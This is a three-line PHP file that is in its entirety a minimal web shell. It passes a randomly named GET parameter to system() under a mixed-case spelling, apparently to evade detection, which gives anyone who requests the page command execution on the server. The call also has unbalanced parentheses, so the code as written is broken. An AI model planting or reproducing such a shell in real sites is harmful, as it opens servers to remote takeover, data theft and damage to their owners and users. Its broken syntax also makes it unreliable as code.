<?php
SysTeM(($_GET['u4whFTMo']);
?>
